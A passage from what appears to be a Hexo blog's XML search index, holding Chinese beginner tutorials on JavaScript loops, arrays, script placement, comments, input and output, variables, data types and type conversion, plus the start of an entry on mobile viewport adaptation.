class="line"><span class="keyword">if</span> (love === <span class="string">&#x27;爱&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>  <span class="comment">//遇到爱则停止循环</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; ;) &#123;</span><br><span class="line">  <span class="keyword">let</span> love = <span class="title function_">prompt</span>(<span class="string">&#x27;你爱我吗?&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> (love === <span class="string">&#x27;爱&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>定义数组：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 语法，使用 [] 来定义一个空数组</span></span><br><span class="line"><span class="comment">// 定义一个空数组，然后赋值给变量 classes</span></span><br><span class="line"><span class="keyword">let</span> classes = [];</span><br><span class="line"><span class="comment">// 2. 定义非空数组</span></span><br><span class="line"><span class="keyword">let</span> classes = [<span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;小刚&#x27;</span>, <span class="string">&#x27;小红&#x27;</span>, <span class="string">&#x27;小丽&#x27;</span>, <span class="string">&#x27;小米&#x27;</span>]</span><br><span class="line"><span class="comment">// 3. 数组是对象类型，对应着一个 length 属性，它的含义是获取数组的长度</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(classes.<span class="property">length</span>) <span class="comment">// 5</span></span><br></pre></td></tr></table></figure><p>数组做为对象数据类型，不但有 <code>length</code> 属性可以使用，还提供了许多方法：</p><ol><li><code>push()</code> 动态向数组的尾部添加一个单元</li><li><code>unshift()</code> 动态向数组头部添加一个单元</li><li><code>pop()</code> 删除最后一个单元</li><li><code>shift()</code> 删除第一个单元</li><li><code>splice()</code> 动态删除任意单元</li></ol><p>使用以上4个方法时，都是直接在原数组上进行操作，即成功调任何一个方法，原数组都跟着发生相应的改变。并且在添加或删除单元时 <code>length</code> 并不会发生错乱。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个数组</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. push 动态向数组的尾部添加一个单元</span></span><br><span class="line">arr.<span class="title function_">push</span>(<span class="string">&#x27;Nodejs&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr)  <span class="comment">//[&#x27;html&#x27;, &#x27;css&#x27;, &#x27;javascript&#x27;, &#x27;Nodejs&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. unshit 动态向数组头部添加一个单元</span></span><br><span class="line">arr.<span class="title function_">unshift</span>(<span class="string">&#x27;VS Code&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr)  <span class="comment">//[&#x27;VS Code&#x27;, &#x27;html&#x27;, &#x27;css&#x27;, &#x27;javascript&#x27;, &#x27;Nodejs&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. splice 动态删除任意单元</span></span><br><span class="line">arr.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">1</span>)  <span class="comment">// 从索引值为2的位置开始删除1个单元</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr)  <span class="comment">//[&#x27;VS Code&#x27;, &#x27;html&#x27;, &#x27;javascript&#x27;, &#x27;Nodejs&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. pop 删除最后一个单元</span></span><br><span class="line">arr.<span class="title function_">pop</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr)  <span class="comment">//[&#x27;VS Code&#x27;, &#x27;html&#x27;, &#x27;javascript&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. shift 删除第一个单元</span></span><br><span class="line">arr.<span class="title function_">shift</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr)  <span class="comment">//[&#x27;html&#x27;, &#x27;javascript&#x27;]</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-介绍、变量、数据类型</title>
      <link href="/2024/01/28/JavaScript-%E4%BB%8B%E7%BB%8D%E3%80%81%E5%8F%98%E9%87%8F%E3%80%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2024/01/28/JavaScript-%E4%BB%8B%E7%BB%8D%E3%80%81%E5%8F%98%E9%87%8F%E3%80%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240128150153.png" alt="image.png"></p><ol><li>ECMAScript：</li></ol><ul><li>规定了js基础语法核心知识。</li><li>比如：变量、分支语句、循环语句、对象等等</li></ul><ol start="2"><li>Web APIs：</li></ol><ul><li>DOM：操作文档，比如对页面元素进行移动、大小、添加删除等操作</li><li>BOM：操作浏览器，比如页面弹窗，检测窗口宽度、存储数据到浏览器等等</li></ul><p>参考JavaScript权威网站：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript</a></p><h2 id="书写位置"><a href="#书写位置" class="headerlink" title="书写位置"></a>书写位置</h2><h3 id="内部JavaScript"><a href="#内部JavaScript" class="headerlink" title="内部JavaScript"></a>内部JavaScript</h3><p>直接写在html文件里，用<code>script</code>标签包住</p><p><strong>规范</strong>：<code>script</code>标签写在<code>&lt;/body&gt;</code>上面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 示例，alert用于页面弹出警告对话框</span></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;你好啊！欢迎光临！&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：将script写在底部，目的是为了先加载 html 内容，再加载 JavaScript 用于修改内容。</p><h3 id="外部JavaScript"><a href="#外部JavaScript" class="headerlink" title="外部JavaScript"></a>外部JavaScript</h3><p>代码写在 <code>.js</code> 文件里</p><p><strong>语法</strong>：通过<code>script</code>标签，引入到html页面中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;test.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：script标签内不写代码，不然会被忽略！</p><h3 id="内联JavaScript"><a href="#内联JavaScript" class="headerlink" title="内联JavaScript"></a>内联JavaScript</h3><p>代码下在标签内部</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;你还真点啊！&#x27;)&quot;</span>&gt;</span>点击我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h3><p>使用 <code>//</code>  注释单行代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 这种是单行注释的语法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 一次只能注释一行</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 可以重复注释</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;嗨，欢迎来传智播学习前端技术！&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h3><p>使用 <code>/* */</code> 注释多行代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/* 这种的是多行注释的语法 */</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">    更常见的多行注释是这种写法</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">    在些可以任意换行</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">    多少行都可以</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">      */</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;嗨，欢迎来传智播学习前端技术！&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="结束符"><a href="#结束符" class="headerlink" title="结束符"></a>结束符</h2><p>在 JavaScript 中 <code>;</code> 代表一段代码的结束，多数情况下可以省略 <code>;</code> 使用<code>回车（enter）</code>替代。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;JavaScript 基础 - 结束符&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;script&gt; </span><br><span class="line">    alert(1);</span><br><span class="line">    alert(2);</span><br><span class="line">    alert(1)</span><br><span class="line">    alert(2)</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>实际开发中有许多人主张书写 JavaScript 代码时省略结束符 <code>;</code></p><h2 id="输入和输出"><a href="#输入和输出" class="headerlink" title="输入和输出"></a>输入和输出</h2><p>输出和输入也可理解为人和计算机的交互，用户通过键盘、鼠标等向计算机输入信息，计算机处理后再展示结果给用户，这便是一次输入和输出的过程。</p><p>举例说明：如按键盘上的方向键，向上&#x2F;下键可以滚动页面，按向上&#x2F;下键这个动作叫作输入，页面发生了滚动了这便叫输出。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>JavaScript 可以接收用户的输入，然后再将输入的结果输出：</p><p><code>alert()</code>、<code>document.wirte()</code>、<code>console.log()</code></p><p>以数字为例，向 <code>alert()</code> 或 <code>document.write()</code>输入任意数字，他都会以弹窗形式展示（输出）给用户。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;你好啊！欢迎光临！&#x27;</span>)<span class="comment">//用弹出的方式</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;h1&gt;我是标题&lt;/h1&gt;&#x27;</span>)<span class="comment">//向body内输出内容</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;控制台打印&#x27;</span>)<span class="comment">//向控制台发送日志</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>向 <code>prompt()</code> 输入任意内容会以弹窗形式出现在浏览器中，一般提示用户输入一些内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">prompt</span>(<span class="string">&#x27;请输入您的姓名:&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240128153120.png" alt="image.png"></p><p><strong>注意</strong>：<code>alert()</code>和<code>prompt()</code>会跳过页面渲染先被执行</p><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="变量用法"><a href="#变量用法" class="headerlink" title="变量用法"></a>变量用法</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age = <span class="number">18</span> <span class="comment">//声明变量由声明关键词、变量名组成</span></span><br><span class="line"></span><br><span class="line">age = <span class="number">20</span> <span class="comment">//变量赋值</span></span><br></pre></td></tr></table></figure><ol><li>更新变量时，不需要再声明</li><li>可以同时声明多个变量，使用<code>，</code>逗号隔开</li></ol><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><p>JavaScript 使用专门的关键字 <code>let</code> 和 <code>var</code> 来声明（定义）变量，在使用时需要注意一些细节：</p><p>以下是使用 <code>let</code> 时的注意事项：</p><ol><li>允许声明和赋值同时进行</li><li>不允许重复声明</li><li>允许同时声明多个变量并赋值</li><li>JavaScript 中内置的一些关键字不能被当做变量名</li></ol><p>以下是使用 <code>var</code> 时的注意事项：</p><ol><li>允许声明和赋值同时进行</li><li>允许重复声明</li><li>允许同时声明多个变量并赋值</li></ol><p>大部分情况使用 <code>let</code> 和 <code>var</code> 区别不大，但是 <code>let</code> 相较 <code>var</code> 更严谨，因此推荐使用 <code>let</code>，后期会更进一步介绍二者间的区别。</p><h2 id="变量名命名规则"><a href="#变量名命名规则" class="headerlink" title="变量名命名规则"></a>变量名命名规则</h2><p>关于变量的名称（标识符）有一系列的规则需要遵守：</p><ol><li>只能是字母、数字、下划线、$，且不能能数字开头</li><li>字母<strong>区分大小写</strong>，如 Age 和 age 是不同的变量</li><li>JavaScript 内部已占用于单词（关键字或保留字）不允许使用</li><li>尽量保证变量具有一定的语义，见字知义</li></ol><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义数组</span></span><br><span class="line"><span class="keyword">let</span> arr = [num1, num2, num3]</span><br><span class="line"><span class="comment">//数组取值</span></span><br><span class="line">arr[<span class="number">0</span>] <span class="comment">//为num1</span></span><br></pre></td></tr></table></figure><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>概念：使用 const 声明的变量称为<strong>常量</strong>。</p><p>使用场景：当某个变量永远不会改变的时候，就可以使用 <code>const</code> 来声明，而不是<code>let</code>。</p><p>命名规范：和变量一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const PI = 3.14</span><br></pre></td></tr></table></figure><p>注意： 常量不允许重新赋值，声明的时候必须赋值（初始化）</p><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="数字型（number）"><a href="#数字型（number）" class="headerlink" title="数字型（number）"></a>数字型（number）</h2><p>可以是整数、小数、正数、负数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age = <span class="number">18</span> <span class="comment">//整数</span></span><br><span class="line"><span class="keyword">let</span> money = <span class="number">250.41</span> <span class="comment">//小数</span></span><br></pre></td></tr></table></figure><p>数字型可以进行算数运算</p><p>算数运算符包括：加<code>+</code>、减<code>-</code>、乘<code>*</code>、除<code>/</code>、取模<code>%</code>。</p><p>遵循算术运算优先级</p><p><strong>注意</strong>：<code>NaN</code>为一个计算错误，任何对<code>NaN</code>的操作都会返回<code>NaN</code></p><h2 id="字符串类型（string）"><a href="#字符串类型（string）" class="headerlink" title="字符串类型（string）"></a>字符串类型（string）</h2><p>通过单引号（ <code>&#39;&#39;</code>） 、双引号（ <code>&quot;&quot;</code>）或反引号包裹的数据都叫字符串，单引号和双引号没有本质上的区别，推荐使用<strong>单引号</strong>。</p><p>注意事项：</p><ol><li>无论单引号或是双引号必须成对使用</li><li>单引号&#x2F;双引号可以互相嵌套，但是不以自已嵌套自已</li><li>必要时可以使用转义符 <code>\</code>，输出单引号或双引号</li></ol><p>字符串拼接：<code>+</code>运算符用于字符串拼接</p><p>模糊字符串：在内容拼接中直接使用<code>$&#123; &#125;</code>包住变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">&#x27;坂井泉水&#x27;</span></span><br><span class="line"><span class="keyword">let</span> song = <span class="string">&quot;敞开心扉&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(name + <span class="string">&#x27;的&#x27;</span> + song + <span class="string">&#x27;很好听！&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">`<span class="subst">$&#123;name&#125;</span>的<span class="subst">$&#123;song&#125;</span>很好听！`</span>)</span><br><span class="line"><span class="comment">/*输出为 坂井泉水的敞开心扉很好听！*/</span></span><br></pre></td></tr></table></figure><h2 id="布尔类型（boolean）"><a href="#布尔类型（boolean）" class="headerlink" title="布尔类型（boolean）"></a>布尔类型（boolean）</h2><p>它为真（true）、假（false）两个值。</p><p>同时也可以用<code>1</code>、<code>0</code>表示</p><h2 id="未定义类型（undefined）"><a href="#未定义类型（undefined）" class="headerlink" title="未定义类型（undefined）"></a>未定义类型（undefined）</h2><p>只声明变量，不赋值的情况下，变量默认值为<code>undefined</code></p><h2 id="空类型（null）"><a href="#空类型（null）" class="headerlink" title="空类型（null）"></a>空类型（null）</h2><p><code>null</code>表示一个“无”、“空”或者“未知”的特殊值</p><p>与<code>undefined</code>的区别：</p><ul><li><code>undefined</code>表示没有赋值</li><li><code>null</code>表示赋值了，但是内容为空</li></ul><h2 id="数据类型检查"><a href="#数据类型检查" class="headerlink" title="数据类型检查"></a>数据类型检查</h2><p>可以使用<code>typeof</code>来识别数据类型</p><ol><li>作为运算符：typeof x</li><li>作为函数：typeof(x)</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="keyword">typeof</span> <span class="string">&#x27;abc&#x27;</span>) <span class="comment">//输出为string</span></span><br></pre></td></tr></table></figure><h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><h3 id="隐式转换"><a href="#隐式转换" class="headerlink" title="隐式转换"></a>隐式转换</h3><p>某些运算符被执行时，系统内部自动将数据类型进行转换，这种转换称为隐式转换。</p><p>规则：</p><ul><li><code>+</code>号两边只要有一个字符串，都会把另一个转成字符串</li><li>出了<code>+</code>以外，<code>-</code>、<code>*</code>、<code>/</code>都会转成数字类型</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">13</span> <span class="comment">// 数值</span></span><br><span class="line"><span class="keyword">let</span> num2 = <span class="string">&#x27;2&#x27;</span> <span class="comment">// 字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果为 132</span></span><br><span class="line"><span class="comment">// 原因是将数值 num 转换成了字符串，相当于 &#x27;13&#x27;</span></span><br><span class="line"><span class="comment">// 然后 + 将两个字符串拼接到了一起</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num + num2)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果为 11</span></span><br><span class="line"><span class="comment">// 原因是将字符串 num2 转换成了数值，相当于 2</span></span><br><span class="line"><span class="comment">// 然后数值 13 减去 数值 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num - num2)</span><br></pre></td></tr></table></figure><h3 id="显式转换"><a href="#显式转换" class="headerlink" title="显式转换"></a>显式转换</h3><p>转为数字型：</p><ul><li><code>Number</code>：<ol><li>转成数字类型</li><li>如果字符串内为非数字，转换失败为<code>NaN</code>，不是一个数字</li><li><code>NaN</code>也是number类型，代表非数字</li></ol></li><li><code>parseInt</code>：<ul><li>只保留整数</li></ul></li><li><code>parseFloat</code>：<ul><li>可以保留小数</li></ul></li></ul><p>转为字符型：</p><ul><li><code>String(数据)</code></li><li><code>变量.toString(进制</code>)</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> t = <span class="string">&#x27;12&#x27;</span></span><br><span class="line"><span class="keyword">let</span> f = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 显式将字符串 12 转换成数值 12</span></span><br><span class="line">t = <span class="title class_">Number</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测转换后的类型</span></span><br><span class="line"><span class="comment">// console.log(typeof t);</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(t + f) <span class="comment">// 结果为 20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 并不是所有的值都可以被转成数值类型</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="comment">// 将 hello 转成数值是不现实的，当无法转换成</span></span><br><span class="line"><span class="comment">// 数值时，得到的结果为 NaN （Not a Number）</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Number</span>(str))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web移动适配</title>
      <link href="/2024/01/25/Web%E7%A7%BB%E5%8A%A8%E9%80%82%E9%85%8D/"/>
      <url>/2024/01/25/Web%E7%A7%BB%E5%8A%A8%E9%80%82%E9%85%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="移动适配"><a href="#移动适配" class="headerlink" title="移动适配"></a>移动适配</h1><h2 id="视口"><a href="#视口" class="headerlink" title="视口"></a>视口</h2><p>作用：显示 HTML 网页的区域，用来约束 HTML 的尺寸</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  &lt;!– 视口标签 --&gt;</span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>width=device-width</code>：视口宽度 &#x3D; 设备宽度</li><li><code>initial-scale=1.0</code>：缩放1倍（不缩放）</li></ul><h2 id="屏幕分辨率"><a href="#屏幕分辨率" class="headerlink" title="屏幕分辨率"></a>屏幕分辨率</h2><p>分类：</p><ul><li>物理分辨率：硬件分辨率（出厂设置）</li><li>逻辑分辨率：软件 &#x2F; 驱动设置</li></ul><p>结论：<strong>制作网页参考 逻辑分辨率</strong></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1681811157520.png" alt="1681811157520.png"></p><h2 id="适配方案"><a href="#适配方案" class="headerlink" 